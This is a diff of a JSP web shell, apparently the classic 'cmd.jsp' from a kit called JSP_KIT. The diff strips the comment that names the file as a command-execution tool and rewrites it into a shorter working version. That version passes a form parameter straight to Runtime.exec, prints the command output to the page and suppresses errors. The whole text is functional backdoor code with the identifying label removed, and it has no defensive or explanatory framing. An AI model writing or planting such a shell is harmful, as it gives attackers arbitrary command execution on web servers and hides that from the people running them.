@@ -1,35 +1,20 @@
 <%@ page import="java.util.*,java.io.*"%>
-<%
-//
-// JSP_KIT
-//
-// cmd.jsp = Command Execution (unix)
-//
-// by: Unknown
-// modified: 27/06/2003
-//
-%>
-<HTML><BODY>
+<HTML><BODY>                                                                                                                                                             
 <FORM METHOD="GET" NAME="myform" ACTION="">
-<INPUT TYPE="text" NAME="cmd">
-<INPUT TYPE="submit" VALUE="Send">
+<INPUT TYPE="text" NAME="cmd">           
+<INPUT TYPE="submit" VALUE="Send">       
 </FORM>
 <pre>
 <%
-if (request.getParameter("cmd") != null) {
-        out.println("Command: " + request.getParameter("cmd") + "<BR>");
-        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
-        OutputStream os = p.getOutputStream();
-        InputStream in = p.getInputStream();
-        DataInputStream dis = new DataInputStream(in);
-        String disr = dis.readLine();
-        while ( disr != null ) {
-                out.println(disr); 
-                disr = dis.readLine(); 
-                }
-        }
+try {
+    String dos=request.getParameter("cmd");
+    Process p = Runtime.getRuntime().exec(dos);
+    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = input.readLine()) != null) { out.println(line); }
+    input.close();
+} catch (Exception e) { out.println(); }
 %>
 </pre>
 </BODY></HTML>
-
 
